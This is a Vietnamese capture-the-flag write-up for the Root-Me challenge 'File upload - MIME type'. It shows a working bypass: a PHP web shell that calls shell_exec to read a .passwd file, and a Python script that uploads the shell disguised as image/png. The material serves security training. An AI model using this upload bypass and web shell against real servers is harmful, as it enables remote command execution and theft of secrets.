# File upload - MIME type

## Solution

Trick là tải lên tệp exploit.php với loại MIME được ủy quyền (images/png - image/jpeg - image/gif) thay vì loại gốc (application/x-http-php)

Sau khi upload, nền tảng web sẽ interpret các file với phần mở rộng của chúng: exploit.php được hiển thị dưới dạng application/x-httpd-php chứ không phải dưới dạng hình ảnh (double extensions không hoạt động)

Hãy khai thác điều này bằng Python!

- Upload image thử nghiệm, test.png

    Lưu ý rằng image có thể được xem tại: http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/SOME_SESSION_ID//test.png

- Upload exploit.php bằng Python

    Payload exploit.php
    ```
    <?php
    $cmd_results = shell_exec('cat ../../../.passwd 2>&1');
    echo "<pre>$cmd_results</pre>";
    ?>
    ```

    Uploading script.py

    ```
    import requests

    url = 'http://challenge01.root-me.org/web-serveur/ch21/?action=upload'
    f = {'file': ('exploit.php', open('exploit.php', 'rb'), 'image/png')}     # File MIME type set to image/png
    r = requests.post(url, files=f, data={'Connection': 'keep-alive'})

    session_id = r.headers['Set-Cookie'].split('=')[1].split(';')[0]          # Session id given by field Set-Cookie in response
    new_url = 'http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/%s//exploit.php' %session_id
    print("[+] File uploaded at %s" %new_url)
    ```

    Terminal:

    ```
    python -m venv virtualenv
    source virtualenv/bin/activate
    pip install requests
    python script.py
    ```

    Mở trình duyệt web có đường dẫn được print là: http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/NEW_SESSION_ID//exploit.php để lấy password!